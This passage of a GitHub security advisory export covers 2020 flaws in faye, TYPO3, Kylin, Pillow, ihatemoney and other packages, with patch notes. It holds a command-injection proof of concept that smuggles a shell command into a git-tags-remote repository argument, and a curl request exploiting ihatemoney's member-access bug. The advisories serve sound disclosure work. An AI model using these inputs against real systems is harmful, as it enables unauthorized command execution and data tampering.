structured. We have a single list of attributes that are permitted across the whole checkout, no matter the step that is being submitted.\n\n### Patches\n\nA PR has been attached to fix the security concern for each of all the Solidus supported versions following the rules of the [Solidus Security Policy](https://solidus.io/security).\n\n### Workarounds\n\nWhen it's not possible to upgrade to a supported patched version, please use this gist to patch the store:\n\nhttps://gist.github.com/kennyadsl/4618cd9797984cb64f7700a81bda889d",
    "summary": "Ability to change order address without triggering address validations in solidus"
  },
  {
    "ghsaId": "GHSA-wwrj-35w6-77ff",
    "publishedAt": "2020-08-04T14:54:08Z",
    "description": "### Impact\nVersions prior to version v1.05 are affected by a CSRF vulnerability, as there is no CSRF mitigation (Tokens etc.). The fix introduced in version v1.05 unintentionally breaks uploading so version v1.0.7 is the fixed version.\n\nThis is patched by implementing [Double submit](https://medium.com/cross-site-request-forgery-csrf/double-submit-cookie-pattern-65bb71d80d9f).\n\nThe CSRF attack would require you to navigate to a malicious site while you have an active session with Save-Server (Session key stored in cookies). The malicious user would then be able to perform some actions, including:\n- Upload file\n- Delete file\n- Add redirect\n\n\n#### If you are logged in as root, this attack is significantly more severe. They can (in addition to the above):\n- Create users\n- Delete users\n- Update users (change password)\n\nIf they updated the password of a user, that user's files would then be available. If the root password is updated, all files would be visible if they logged in with the new password.\n\nNote that due to the same origin policy malicious actors cannot view the gallery or the response of any of the methods, nor be sure they succeeded. \n### Patches\nThis issue has been patched. Update to version v1.0.7 or above to benefit from this fix.\n\n### Workarounds\nNone. You should upgrade.\n\n### References\nWhat is CSRF: https://owasp.org/www-community/attacks/csrf\nFix type: https://medium.com/cross-site-request-forgery-csrf/double-submit-cookie-pattern-65bb71d80d9f\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Save-server](https://github.com/Neztore/save-server/)\n* Email us at [hi@nezto.re](mailto:hi@nezto.re)\n* Join our discord (preferred): [Invite](https://discord.gg/QevWabU) ",
    "summary": "CSRF vulnerability in save-server"
  },
  {
    "ghsaId": "GHSA-2v5c-755p-p4gv",
    "publishedAt": "2020-07-31T17:40:04Z",
    "description": "The `Faye::WebSocket::Client` class uses the [`EM::Connection#start_tls`][1]\nmethod in [EventMachine][2] to implement the TLS handshake whenever a `wss:` URL\nis used for the connection. This method does not implement certificate\nverification by default, meaning that it does not check that the server presents\na valid and trusted TLS certificate for the expected hostname. That means that\nany `wss:` connection made using this library is vulnerable to a\nman-in-the-middle attack, since it does not confirm the identity of the server\nit is connected to.\n\nThis has been a requested feature in EventMachine for many years now; see for\nexample [#275][3], [#378][4], and [#814][5]. In June 2020, [em-http-request][6]\npublished an [advisory][7] related to this problem and fixed it by [implementing\nTLS verification][8] in their own codebase; although EventMachine does not\nimplement certificate verification itself, it provides an extension point for\nthe caller to implement it, called [`ssl_verify_peer`][9]. Based on this\nimplementation, we have incorporated similar functionality into [faye-websocket\nfor Ruby][10], such that we use the `OpenSSL` module to perform two checks:\n\n- The chain of certificates presented by the server is valid and ultimately\n  trusted by your root certificate set -- either your system default root\n  certificates, or a set provided at runtime\n- The final certificate presented by the server is valid for the hostname used\n  in the request URI; if the connection is made via a proxy we use the hostname\n  from the request, not the proxy's hostname\n\nAfter implementing verification in v1.1.6, em-http-request has elected to leave\nthe `:verify_peer` option switched off by default. We have decided to _enable_\nthis option by default in faye-websocket, but are publishing a minor release\nwith added functionality for configuring it. We are mindful of the fact that\nthis may break existing programs, but we consider it much more important that\nall clients have TLS verification turned on by default. A client that is not\ncarrying out verification is either:\n\n- talking to the expected server, and will not break under this change\n- being attacked, and would benefit from being alerted to this fact\n- deliberately talking to a server that would be rejected by verification\n\nThe latter case includes situations like talking to a non-public server using a\nself-signed certificate. We consider this use case to be \"working by accident\",\nrather than functionality that was actively supported, and it should be properly\nand explicitly supported instead. To that end, we have added two new options to\nthe `Faye::WebSocket::Client` constructor: `tls.root_cert_file`, and\n`tls.verify_peer`.\n\nThe `:root_cert_file` option lets you provide a different set of root\ncertificates in situations where you don't want to use your system's default\nroot certificates to verify the remote host. It should be a path or an array of\npaths identifying the certificates to use instead of the defaults.\n\n```rb\nclient = Faye::WebSocket::Client.new('wss://example.com/', [], tls: {\n  root_cert_file: 'path/to/certificate.pem'\n})\n```\n\nThe `:verify_peer` option lets you turn verification off entirely. This should\nbe a last resort and we recommend using the `:root_cert_file` option if\npossible.\n\n```rb\nclient = Faye::WebSocket::Client.new('wss://example.com/', [], tls: {\n  verify_peer: false\n})\n```\n\nTo get the new behaviour, please upgrade to v0.11.0 of the [Rubygems\npackage][10]. There are, unfortunately, no workarounds for this issue, as you\ncannot enable `:verify_peer` in EventMachine unless the calling library contains\nan implementation of `ssl_verify_peer` that actually checks the server's\ncertificates.\n\nFor further background information on this issue, please see [faye#524][12] and\n[faye-websocket#129][13]. We would like to thank [Tero Marttila][14] and [Daniel\nMorsing][15] for providing invaluable assistance and feedback on this issue.\n\n[1]: https://www.rubydoc.info/github/eventmachine/eventmachine/EventMachine/Connection:start_tls\n[2]: https://rubygems.org/gems/eventmachine\n[3]: https://github.com/eventmachine/eventmachine/issues/275\n[4]: https://github.com/eventmachine/eventmachine/pull/378\n[5]: https://github.com/eventmachine/eventmachine/issues/814\n[6]: https://rubygems.org/gems/em-http-request\n[7]: https://securitylab.github.com/advisories/GHSL-2020-094-igrigorik-em-http-request\n[8]: https://github.com/igrigorik/em-http-request/pull/340\n[9]: https://www.rubydoc.info/github/eventmachine/eventmachine/EventMachine/Connection:ssl_verify_peer\n[10]: https://rubygems.org/gems/faye-websocket\n[12]: https://github.com/faye/faye/issues/524\n[13]: https://github.com/faye/faye-websocket-ruby/pull/129\n[14]: https://github.com/SpComb\n[15]: https://github.com/DanielMorsing",
    "summary": "Missing TLS certificate verification in faye-websocket"
  },
  {
    "ghsaId": "GHSA-3q49-h8f9-9fr9",
    "publishedAt": "2020-07-31T17:39:42Z",
    "description": "Faye uses [em-http-request][6] and [faye-websocket][10] in the Ruby version of\nits client. Those libraries both use the [`EM::Connection#start_tls`][1] method\nin [EventMachine][2] to implement the TLS handshake whenever a `wss:` URL is\nused for the connection. This method does not implement certificate verification\nby default, meaning that it does not check that the server presents a valid and\ntrusted TLS certificate for the expected hostname. That means that any `https:`\nor `wss:` connection made using these libraries is vulnerable to a\nman-in-the-middle attack, since it does not confirm the identity of the server\nit is connected to.\n\nThe first request a Faye client makes is always sent via normal HTTP, but later\nmessages may be sent via WebSocket. Therefore it is vulnerable to the same\nproblem that these underlying libraries are, and we needed both libraries to\nsupport TLS verification before Faye could claim to do the same. Your client\nwould still be insecure if its initial HTTPS request was verified, but later\nWebSocket connections were not.\n\nThis has been a requested feature in EventMachine for many years now; see for\nexample [#275][3], [#378][4], and [#814][5]. In June 2020, em-http-request\npublished an [advisory][7] related to this problem and fixed it by [implementing\nTLS verification][8] in their own codebase; although EventMachine does not\nimplement certificate verification itself, it provides an extension point for\nthe caller to implement it, called [`ssl_verify_peer`][9]. Based on this\nimplementation, we have incorporated similar functionality into faye-websocket.\n\nAfter implementing verification in v1.1.6, em-http-request has elected to leave\nthe `:verify_peer` option switched off by default. We have decided to _enable_\nthis option by default in Faye, but are publishing a minor release with added\nfunctionality for configuring it. We are mindful of the fact that this may break\nexisting programs, but we consider it much more important that all clients have\nTLS verification turned on by default. A client that is not carrying out\nverification is either:\n\n- talking to the expected server, and will not break under this change\n- being attacked, and would benefit from being alerted to this fact\n- deliberately talking to a server that would be rejected by verification\n\nThe latter case includes situations like talking to a non-public server using a\nself-signed certificate. We consider this use case to be \"working by accident\",\nrather than functionality that was actively supported, and it should be properly\nand explicitly supported instead.\n\nWe are releasing Faye v1.4.0, which enables verification by default and provides\na way to opt out of it:\n\n```rb\nclient = Faye::Client.new('https://example.com/', tls: { verify_peer: false })\n```\n\nUnfortunately we can't offer an equivalent of the `:root_cert_file` option that\nhas been added to faye-websocket, because em-http-request does not support it.\nIf you need to talk to servers whose certificates are not recognised by your\ndefault root certificates, then you need to add its certificate (or another one\nthat can verify it) to your system's root set.\n\nThe same functionality is now supported in the Node.js version, with a `tls`\noption whose values will be passed to the `https` and `tls` modules as\nappropriate when making connections. For example, you can provide your own CA\ncertificate:\n\n```js\nvar client = new faye.Client('https://example.com/', {\n  tls: {\n    ca: fs.readFileSync('path/to/certificate.pem')\n  }\n});\n```\n\nFor further background information on this issue, please see [faye#524][12] and\n[faye-websocket#129][13]. We would like to thank [Tero Marttila][14] and [Daniel\nMorsing][15] for providing invaluable assistance and feedback on this issue.\n\n[1]: https://www.rubydoc.info/github/eventmachine/eventmachine/EventMachine/Connection:start_tls\n[2]: https://rubygems.org/gems/eventmachine\n[3]: https://github.com/eventmachine/eventmachine/issues/275\n[4]: https://github.com/eventmachine/eventmachine/pull/378\n[5]: https://github.com/eventmachine/eventmachine/issues/814\n[6]: https://rubygems.org/gems/em-http-request\n[7]: https://securitylab.github.com/advisories/GHSL-2020-094-igrigorik-em-http-request\n[8]: https://github.com/igrigorik/em-http-request/pull/340\n[9]: https://www.rubydoc.info/github/eventmachine/eventmachine/EventMachine/Connection:ssl_verify_peer\n[10]: https://rubygems.org/gems/faye-websocket\n[11]: https://faye.jcoglan.com/\n[12]: https://github.com/faye/faye/issues/524\n[13]: https://github.com/faye/faye-websocket-ruby/pull/129\n[14]: https://github.com/SpComb\n[15]: https://github.com/DanielMorsing",
    "summary": "Missing TLS certificate verification"
  },
  {
    "ghsaId": "GHSA-fpqv-x9hm-35j9",
    "publishedAt": "2020-07-31T17:39:22Z",
    "description": "### Impact\nKitodo.Presentation fails to properly encode URL parameters for output in HTML making it vulnerable to Cross Site Scripting (XSS). Only sites using the `ListView`, `Navigation` or `PageView` plugins are affected.\n\nIt also includes jQuery 3.4.1 which is known to be vulnerable against Cross Site Scripting, although there is currently no known way to exploit this in Kitodo.Presentation.\n\n### Patches\nAn updated version of Kitodo.Presentation is available on [GitHub](https://github.com/kitodo/kitodo-presentation/releases/tag/v3.1.2), [Packagist](https://packagist.org/packages/kitodo/presentation#v3.1.2) and in the [TYPO3 Extension Repository](https://extensions.typo3.org/extension/dlf/). Users are advised to update as soon as possible.\n\nThe issue was also fixed in release 2.3.1 of the 2.x branch, although it is generally not recommended to run this branch since it depends on an outdated TYPO3 version.\n\n### References\nTYPO3 Security Advisory [TYPO3-EXT-SA-2020-015](https://typo3.org/security/advisory/typo3-ext-sa-2020-015)\njQuery Security Advisory [GHSA-gxr4-xjj5-5px2](https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2)\nOpen Bug Bounty Report [OBB-1219978](https://www.openbugbounty.org/reports/1219978/)\n\n### Contact\nIf you have any questions or comments about this advisory:\n* [Open an issue](https://github.com/kitodo/kitodo-presentation/issues/new/choose)\n* Email us at [security@kitodo.org](mailto:security@kitodo.org)",
    "summary": "Potential XSS vulnerability in Kitodo.Presentation"
  },
  {
    "ghsaId": "GHSA-6jmr-jfh7-xg3h",
    "publishedAt": "2020-07-30T14:58:53Z",
    "description": "### Impact\nIn the npm package named \"slp-validate\", versions prior to 1.2.2 are vulnerable to false-positive validation outcomes for the NFT1 Child Genesis transaction type. A poorly implemented SLP wallet or opportunistic attacker could create a seemingly valid NFT1 child token without burning any of the NFT1 Group token type as is required by the NFT1 specification.\n\n### Patches\nnpm package \"slp-validate\" has been patched and is published and tagged as version 1.2.2.\n\n### Workarounds\nUpgrade to slp-validate 1.2.2.\n\n### References\n* Package location: https://www.npmjs.com/package/slp-validate\n* SLP NFT1 spec: https://slp.dev/specs/slp-nft-1/#nft1-protocol-requirements\n* Git commit hash fixing this issue: https://github.com/simpleledger/slp-validate.js/commit/3963cf914afae69084059b82483da916d97af65c\n* Unit tests have been added to assist validator implementations in avoiding this bug: https://github.com/simpleledger/slp-unit-test-data/commit/8c942eacfae12686dcf1f3366321445a4fba73e7\n\n### For more information\nIf you have any questions or comments about this advisory please open an issue in the [slp-validate](https://github.com/simpleledger/slp-validate.js/issues) repository.",
    "summary": "False-positive validity for NFT1 genesis transactions"
  },
  {
    "ghsaId": "GHSA-cc2p-4jhr-xhhx",
    "publishedAt": "2020-07-30T14:58:42Z",
    "description": "### Impact\nIn the npm package named \"slpjs\", versions prior to 0.27.4 are vulnerable to false-positive validation outcomes for the NFT1 Child Genesis transaction type. A poorly implemented SLP wallet or opportunistic attacker could create a seemingly valid NFT1 child token without burning any of the NFT1 Group token type as is required by the NFT1 specification.\n\n### Patches\nnpm package \"slpjs\" has been patched and is published and tagged as version 0.27.4.\n\n### Workarounds\nUpgrade to slpjs 0.27.4.\n\n### References\n* Package location: https://www.npmjs.com/package/slpjs\n* SLP NFT1 spec: https://slp.dev/specs/slp-nft-1/#nft1-protocol-requirements\n* Git commit hash fixing this issue: https://github.com/simpleledger/slpjs/commit/290c20e8bff13ac81459d43e54cac232b5e3456c\n* Unit tests have been added to assist validator implementations in avoiding this bug: https://github.com/simpleledger/slp-unit-test-data/commit/8c942eacfae12686dcf1f3366321445a4fba73e7\n\n### For more information\nIf you have any questions or comments about this advisory please open an issue in the [slp-validate](https://github.com/simpleledger/slpjs/issues) repository.",
    "summary": "False-positive validity for NFT1 genesis transactions in SLPJS"
  },
  {
    "ghsaId": "GHSA-ff7x-qrg7-qggm",
    "publishedAt": "2020-07-29T20:56:59Z",
    "description": "Prototype pollution vulnerability in dot-prop npm package before versions 4.2.1 and 5.1.1 allows an attacker to add arbitrary properties to JavaScript language constructs such as objects.",
    "summary": "Prototype Pollution in dot-prop"
  },
  {
    "ghsaId": "GHSA-vh7m-p724-62c2",
    "publishedAt": "2020-07-29T20:40:35Z",
    "description": "The Elliptic package before version 6.5.3 for Node.js allows ECDSA signature malleability via variations in encoding, leading '\\0' bytes, or integer overflows. This could conceivably have a security-relevant impact if an application relied on a single canonical signature.",
    "summary": "Signature Malleabillity in elliptic"
  },
  {
    "ghsaId": "GHSA-9vfj-5g7h-4p24",
    "publishedAt": "2020-07-29T18:08:48Z",
    "description": "Server-Side Template Injection and arbitrary file disclosure on Camel templating components",
    "summary": "Server side template injection in Apache Camel"
  },
  {
    "ghsaId": "GHSA-q7j5-9j77-g4gq",
    "publishedAt": "2020-07-29T18:07:41Z",
    "description": "The turn extension through 0.3.2 for TYPO3 allows Remote Code Execution.",
    "summary": "Remote code execution in turn extension for TYPO3"
  },
  {
    "ghsaId": "GHSA-57gr-jvqr-3hwm",
    "publishedAt": "2020-07-29T18:07:38Z",
    "description": "The typo3_forum extension before 1.2.1 for TYPO3 has Incorrect Access Control.",
    "summary": "Incorrect access control in typo3_forum"
  },
  {
    "ghsaId": "GHSA-vr98-27qj-3c8q",
    "publishedAt": "2020-07-29T18:07:35Z",
    "description": "This affects all versions of package rollup-plugin-dev-server. There is no path sanitization in readFile operation inside the readFileFromContentBase function.",
    "summary": "Directory traversal in rollup-plugin-server"
  },
  {
    "ghsaId": "GHSA-f97h-2pfx-f59f",
    "publishedAt": "2020-07-29T18:07:20Z",
    "description": "This affects all versions of package uvicorn. Uvicorn's implementation of the HTTP protocol for the httptools parser is vulnerable to HTTP response splitting. CRLF sequences are not escaped in the value of HTTP headers. Attackers can exploit this to add arbitrary headers to HTTP responses, or even return an arbitrary response body, whenever crafted input is used to construct HTTP headers.",
    "summary": "HTTP response splitting in uvicorn"
  },
  {
    "ghsaId": "GHSA-33c7-2mpw-hg34",
    "publishedAt": "2020-07-29T18:07:16Z",
    "description": "This affects all versions of package uvicorn. The request logger provided by the package is vulnerable to ASNI escape sequence injection. Whenever any HTTP request is received, the default behaviour of uvicorn is to log its details to either the console or a log file. When attackers request crafted URLs with percent-encoded escape sequences, the logging component will log the URL after it's been processed with urllib.parse.unquote, therefore converting any percent-encoded characters into their single-character equivalent, which can have special meaning in terminal emulators. By requesting URLs with crafted paths, attackers can: * Pollute uvicorn's access logs, therefore jeopardising the integrity of such files. * Use ANSI sequence codes to attempt to interact with the terminal emulator that's displaying the logs (either in real time or from a file).",
    "summary": "Log injection in uvicorn"
  },
  {
    "ghsaId": "GHSA-34gh-3cwv-wvp2",
    "publishedAt": "2020-07-29T18:07:11Z",
    "description": "This affects all versions of package rollup-plugin-server. There is no path sanitization in readFile operation performed inside the readFileFromContentBase function.",
    "summary": "Directory traversal in rollup-plugin-server"
  },
  {
    "ghsaId": "GHSA-8m73-w2r2-6xxj",
    "publishedAt": "2020-07-29T17:29:51Z",
    "description": "This affects all versions of package UmbracoForms. When using the default configuration for upload forms, it is possible to upload arbitrary file types. The package offers a way for users to mitigate the issue. The users of this package can create a custom workflow and frontend validation that blocks certain file types, depending on their security needs and policies.",
    "summary": "Insecure defaults in UmbracoForms"
  },
  {
    "ghsaId": "GHSA-5jpf-pj32-xx53",
    "publishedAt": "2020-07-29T16:26:22Z",
    "description": "### Overview\nVersions before and including `2.27.0` use a block list of specific keys that should be sanitized from the request object contained in the error object.  When a request to Auth0 management API fails, the key for `Authorization` header is not sanitized and the `Authorization` header value can be logged exposing a bearer token.\n\n### Am I affected?\nYou are affected by this vulnerability if all of the following conditions apply:\n\n- You are using `auth0` npm package\n- You are using a Machine to Machine application authorized to use Auth0's management API https://auth0.com/docs/flows/concepts/client-credentials\n\n### How to fix that?\nUpgrade to version `2.27.1`\n\n### Will this update impact my users?\nThe fix provided in patch will not affect your users.\n\n### Credit\nhttp://github.com/osdiab",
    "summary": "Authorization header is not sanitized in an error object in auth0"
  },
  {
    "ghsaId": "GHSA-3x94-fv5h-5q2c",
    "publishedAt": "2020-07-29T16:15:32Z",
    "description": "> ### Meta\n> * CVSS: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` (7.5)\n> * CWE-20, CWE-200\n\n### Problem\nIn case an attacker manages to generate a valid cryptographic message authentication code (HMAC-SHA1) - either by using a different existing vulnerability or in case the internal _encryptionKey_ was exposed - it is possible to retrieve arbitrary files of a TYPO3 installation. This includes the possibility to fetch _typo3conf/LocalConfiguration.php_ which again contains the _encryptionKey_ as well as credentials of the database management system being used.\n\nIn case a database server is directly accessible either via internet or in a shared hosting network, this allows to completely retrieve, manipulate or delete database contents. This includes creating an administration user account - which can be used to trigger remote code execution by injecting custom extensions.\n\n### Solution\nUpdate to TYPO3 versions 9.5.20 or 10.4.6 that fix the problem described.\n\n### Credits\nThanks to TYPO3 security team member Oliver Hader who reported and fixed the issue.\n\n### References\n* [TYPO3-CORE-SA-2020-007](https://typo3.org/security/advisory/typo3-core-sa-2020-007)",
    "summary": "Exposure of Sensitive Information to an Unauthorized Actor in TYPO3 CMS"
  },
  {
    "ghsaId": "GHSA-m5vr-3m74-jwxp",
    "publishedAt": "2020-07-29T16:15:19Z",
    "description": "> ### Meta\n> * CVSS: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` (8.2)\n> * CWE-325, CWE-20, CWE-200, CWE-502\n\n### Problem\nIt has been discovered that an internal verification mechanism can be used to generate arbitrary checksums. This allows to inject arbitrary data having a valid cryptographic message authentication code (HMAC-SHA1) and can lead to various attack chains as described below.\n\n* [TYPO3-CORE-SA-2020-007](https://typo3.org/security/advisory/typo3-core-sa-2020-007), [CVE-2020-15099](https://nvd.nist.gov/vuln/detail/CVE-2020-15099): Potential Privilege Escalation\n  + the database server used for a TYPO3 installation must be accessible for an attacker (either via internet or shared hosting network)\n  + `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` (7.5, high)\n* [TYPO3-CORE-SA-2016-013](https://typo3.org/security/advisory/typo3-core-sa-2016-013), [CVE-2016-5091](https://nvd.nist.gov/vuln/detail/CVE-2016-5091): Insecure Deserialization & Remote Code Execution\n  + an attacker must have access to at least one Extbase plugin or module action in a TYPO3 installation\n  + `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` (9.1, critical)\n\nThe overall severity of this vulnerability is **high (8.2)** based on mentioned attack chains and the requirement of having a valid backend user session (authenticated).\n\n### Solution\nUpdate to TYPO3 versions 9.5.20 or 10.4.6 that fix the problem described.\n\n### Credits\nThanks to TYPO3 security team member Oliver Hader who reported and fixed the issue.\n\n### References\n* [TYPO3-CORE-SA-2020-008](https://typo3.org/security/advisory/typo3-core-sa-2020-008)",
    "summary": "Missing Required Cryptographic Step Leading to Sensitive Information Disclosure in TYPO3 CMS"
  },
  {
    "ghsaId": "GHSA-4h44-w6fm-548g",
    "publishedAt": "2020-07-29T16:15:12Z",
    "description": "> ### Meta\n> * CVSS: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` (9.1)\n> * CWE-325, CWE-20, CWE-200, CWE-502\n\n### Problem\nIt has been discovered that an internal verification mechanism can be used to generate arbitrary checksums. This allows to inject arbitrary data having a valid cryptographic message authentication code (HMAC-SHA1) and can lead to various attack chains as described below.\n\n* [TYPO3-CORE-SA-2020-007](https://typo3.org/security/advisory/typo3-core-sa-2020-007), [CVE-2020-15099](https://nvd.nist.gov/vuln/detail/CVE-2020-15099): Potential Privilege Escalation\n  + the database server used for a TYPO3 installation must be accessible for an attacker (either via internet or shared hosting network)\n  + `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` (7.5, high)\n* [TYPO3-CORE-SA-2016-013](https://typo3.org/security/advisory/typo3-core-sa-2016-013), [CVE-2016-5091](https://nvd.nist.gov/vuln/detail/CVE-2016-5091): Insecure Deserialization & Remote Code Execution\n  + an attacker must have access to at least one Extbase plugin or module action in a TYPO3 installation\n  + `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` (9.1, critical)\n\nThe overall severity of this vulnerability is critical (9.1) based on mentioned attack chains and the fact it does not require any privileges.\n\n### Solution\nIn case the extension is not used and required at all, it is suggested to uninstall and remove it from the system completely. Otherwise, an updated version 7.6.5 is available from the TYPO3 extension manager, Packagist and the TYPO3 extension repository:\n\n* https://extensions.typo3.org/extension/download/mediace/7.6.5/zip/\n* https://packagist.org/packages/friendsoftypo3/mediace#7.6.5\n\nAs a precautionary measure it is advised to change `encryptionKey` and database credentials in `typo3conf/LocalConfiguration.php`.\n\n### Credits\nThanks to TYPO3 security team member Oliver Hader who reported and fixed the issue.\n\n### References\n* [TYPO3-EXT-SA-2020-014](https://typo3.org/security/advisory/typo3-ext-sa-2020-014)",
    "summary": "Potential Remote Code Execution in TYPO3 with mediace extension"
  },
  {
    "ghsaId": "GHSA-gm9x-q798-hmr4",
    "publishedAt": "2020-07-29T14:53:40Z",
    "description": "All versions of `git-tags-remote ` are vulnerable to Command Injection. The package fails to sanitize the repository input and passes it directly to an `exec` call on the `get` function . This may allow attackers to execute arbitrary code in the system if the `repo` value passed to the function is user-controlled.  \n\nThe following proof-of-concept creates a file in `/tmp`:  \n```\nconst gitTagsRemote = require('git-tags-remote');\n\ngitTagsRemote.get('https://github.com/sh0ji/git-tags-remote.git; echo \"Injection Success\" > /tmp/command-injection.test')\n.then(tags => console.log(tags));\n```",
    "summary": "Command Injection in git-tags-remote"
  },
  {
    "ghsaId": "GHSA-7hmh-8gwv-mfvq",
    "publishedAt": "2020-07-27T22:51:47Z",
    "description": "Kylin has some restful apis which will concatenate SQLs with the user input string, a user is likely to be able to run malicious database queries.",
    "summary": "SQL Injection in Kylin"
  },
  {
    "ghsaId": "GHSA-gprm-xqrc-c2j3",
    "publishedAt": "2020-07-27T22:51:44Z",
    "description": "Kylin has some restful apis which will concatenate os command with the user input string, a user is likely to be able to execute any os command without any protection or validation.",
    "summary": "Command Injection in Kylin"
  },
  {
    "ghsaId": "GHSA-hx5g-8hq2-8x4w",
    "publishedAt": "2020-07-27T22:51:40Z",
    "description": "Kylin concatenates and executes a Hive SQL in Hive CLI or beeline when building a new segment; some part of the HQL is from system configurations, while the configuration can be overwritten by certain rest api, which makes SQL injection attack is possible. Users of all previous versions after 2.0 should upgrade to 3.1.0.",
    "summary": "SQL Injection in Kylin"
  },
  {
    "ghsaId": "GHSA-qwfw-gxx2-mmv2",
    "publishedAt": "2020-07-27T22:51:37Z",
    "description": "Similar to CVE-2020-1956, Kylin has one more restful API which concatenates the API inputs into OS commands and then executes them on the server; while the reported API misses necessary input validation, which causes the hackers to have the possibility to execute OS command remotely. Users of all previous versions after 2.3 should upgrade to 3.1.0.",
    "summary": "Command Injection in Kylin"
  },
  {
    "ghsaId": "GHSA-cqhg-xjhh-p8hf",
    "publishedAt": "2020-07-27T21:52:43Z",
    "description": "Pillow before 6.2.3 and 7.x before 7.0.1 has multiple out-of-bounds reads in libImaging/FliDecode.c.",
    "summary": "Out-of-bounds reads in Pillow"
  },
  {
    "ghsaId": "GHSA-8843-m7mw-mxqm",
    "publishedAt": "2020-07-27T21:52:41Z",
    "description": "In Pillow before 6.2.3 and 7.x before 7.0.1, there are two Buffer Overflows in libImaging/TiffDecode.c.",
    "summary": "Buffer overflow in Pillow"
  },
  {
    "ghsaId": "GHSA-vj42-xq3r-hr3r",
    "publishedAt": "2020-07-27T21:52:39Z",
    "description": "In libImaging/Jpeg2KDecode.c in Pillow before 7.0.0, there are multiple out-of-bounds reads via a crafted JP2 file.",
    "summary": "Out-of-bounds reads in Pillow"
  },
  {
    "ghsaId": "GHSA-43fq-w8qq-v88h",
    "publishedAt": "2020-07-27T21:52:36Z",
    "description": "In libImaging/SgiRleDecode.c in Pillow through 7.0.0, a number of out-of-bounds reads exist in the parsing of SGI image files, a different issue than CVE-2020-5311.",
    "summary": "Out-of-bounds read in Pillow"
  },
  {
    "ghsaId": "GHSA-vc9j-fhvv-8vrf",
    "publishedAt": "2020-07-27T19:55:52Z",
    "description": "MIT Lifelong Kindergarten Scratch scratch-vm before 0.2.0-prerelease.20200714185213 loads extension URLs from untrusted project.json files with certain _ characters, resulting in remote code execution because the URL's content is treated as a script and is executed as a worker. The responsible code is getExtensionIdForOpcode in serialization/sb3.js. The use of _ is incompatible with a protection mechanism in older versions, in which URLs were split and consequently deserialization attacks were prevented. \nNOTE: the scratch.mit.edu hosted service is not affected because of the lack of worker scripts.",
    "summary": "Remote Code Execution in scratch-vm"
  },
  {
    "ghsaId": "GHSA-jphg-qwrw-7w9g",
    "publishedAt": "2020-07-27T18:08:21Z",
    "description": "The JSON gem through 2.2.0 for Ruby, as used in Ruby 2.4 through 2.4.9, 2.5 through 2.5.7, and 2.6 through 2.6.5, has an Unsafe Object Creation Vulnerability. This is quite similar to CVE-2013-0269/GHSA-x457-cw4h-hq5f, but does not rely on poor garbage-collection behavior within Ruby. Specifically, use of JSON parsing methods can lead to creation of a malicious object within the interpreter, with adverse effects that are application-dependent.",
    "summary": "Unsafe object creation in json RubyGem"
  },
  {
    "ghsaId": "GHSA-67j9-c52g-w2q9",
    "publishedAt": "2020-07-27T17:47:52Z",
    "description": "### Impact\nAn authenticated member of one project can modify and delete members of another project, without knowledge of this other project's private code. This can be further exploited to access all bills of another project without knowledge of this other project's private code.\n\nWith the default configuration, anybody is allowed to create a new project. An attacker can create a new project and then use it to become authenticated and exploit this flaw. As such, the exposure is similar to an unauthenticated attack, because it is trivial to become authenticated.\n\n### Patches\n```diff\n ihatemoney/models.py | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\ndiff --git a/ihatemoney/models.py b/ihatemoney/models.py\nindex fe7b519..5691c75 100644\n--- a/ihatemoney/models.py\n+++ b/ihatemoney/models.py\n@@ -380,7 +380,7 @@ class Person(db.Model):\n         def get_by_name(self, name, project):\n             return (\n                 Person.query.filter(Person.name == name)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )\n \n@@ -389,7 +389,7 @@ class Person(db.Model):\n                 project = g.project\n             return (\n                 Person.query.filter(Person.id == id)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )\n \n```\n\n### Workarounds\n\nTo limit the impact, it is possible to disable public project creation by setting `ALLOW_PUBLIC_PROJECT_CREATION = False` in the configuration (see [documentation](https://ihatemoney.readthedocs.io/en/latest/configuration.html)). Existing users will still be able to exploit the flaw, but this will prevent an external attacker from creating a new project.\n\n### For more information\n\n`Person.query.get()` and `Person.query.get_by_name()` were mistakenly running a database join on the Project table without constraining the result.\n\nAs a result, `Person.query.get(42, \"projectfoo\")` would return the Person with id=42, even if it is not associated to the project \"projectfoo\".  The only condition is that \"projectfoo\" must exist.\n\nThis flaw can be exploited in several places:\n\n1) API: PUT requests to `/api/projects/<project>/members/<personID>` will succeed even though `<personID>` is not a member of `<project>`.\n\n   This allows an authenticated attacker to alter the state of a member (name, weight, activated) in any project.  In addition, the altered member will no longer be associated with its original project but will be associated to the attacker project instead, breaking many features of IHateMoney.  For instance, bills referencing the altered member will no longer be visible in the original project.\n\n   This causes an additional information disclosure and loss of integrity on bills: the attacker will now be able to see, edit and delete bills belonging to the altered member, because IHateMoney now believes that these bills are associated to the attacker project through the altered member.\n\n   For instance, assume that `Person(id=42)` is a member of project \"targetProject\", and that the attacker has access to another project \"attackerProject\" with the private code \"attackerPassword\".  The attacker can modify `Person(id=42)` with this command:\n\n     $ curl -X PUT -d \"name=Pwn3d&activated=1\" --basic -u attackerProject:attackerPassword http://$SERVER/api/projects/attackerProject/members/42\n\n   The attacker can now see, edit and delete bills paid by `Person(id=42)` by simply browsing to http://$SERVER/attackerProject/\n\n2) Editing a member through the web interface at `/<project>/members/<personID>/edit` will succeed even though `<personID>` is not a member of `<project>`.\n\n   This is very similar to the PUT exploit.  Reusing the same example, the attacker needs to login to its \"attackerProject\" project with the private code \"attackerPassword\".  It can then alter the state of `Person(id=42)` by accessing the edit form at the following URL:\n\n     